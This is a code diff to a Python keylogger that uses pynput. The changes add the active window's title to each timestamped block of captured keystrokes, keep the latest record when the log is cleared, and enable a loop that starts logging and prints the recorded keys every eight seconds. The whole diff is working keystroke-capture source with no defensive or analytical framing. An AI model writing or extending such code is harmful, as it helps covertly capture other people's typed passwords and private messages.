@@ -1,7 +1,7 @@
 from abc import ABC, abstractmethod
 from pynput.keyboard import Listener
 from typing import List
-import time,json,random,string,ToolBox,threading
+import time,json,random,string,ToolBox,threading,pywinctl
 
 
 class IKeyLogger(ABC):
@@ -31,28 +31,30 @@ class Write(ABC):
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.__logged_keys = {}
-        self.__last_time = ""
+        self.__last_record = ""
         self.__last_type_time = None
+        self.__last_window = None
 
     def on_press(self, key) -> None:
         key = ToolBox.format_key(key)
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
+        active_window = pywinctl.getActiveWindow()
 
-        if self.__last_type_time is None or current_time - self.__last_type_time >= 15:
-            self.__last_time = current_time_formatted
-
+        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
+            self.__last_record = active_window.title + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
-        if self.__last_time not in self.__logged_keys:
-            self.__logged_keys[self.__last_time] = ""
-        self.__logged_keys[self.__last_time] += key
+        self.__last_window = active_window
+        if self.__last_record not in self.__logged_keys:
+            self.__logged_keys[self.__last_record] = ""
+        self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
         return self.__logged_keys
 
     def clear_logged_keys(self) -> dict[str:str]:
-        self.__logged_keys = {}
+        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
 
 
 
@@ -108,15 +110,11 @@ class KeyLoggerManager:
             print(key)
             print(value)
 
-# x = KeyLoggerManager()
-# x.start_logging()
-# while True:
-#     time.sleep(20)
-#     x.print_keys()
-
-
-
-
+x = KeyLoggerManager()
+x.start_logging()
+while True:
+    time.sleep(8)
+    x.print_keys()
 
 
 
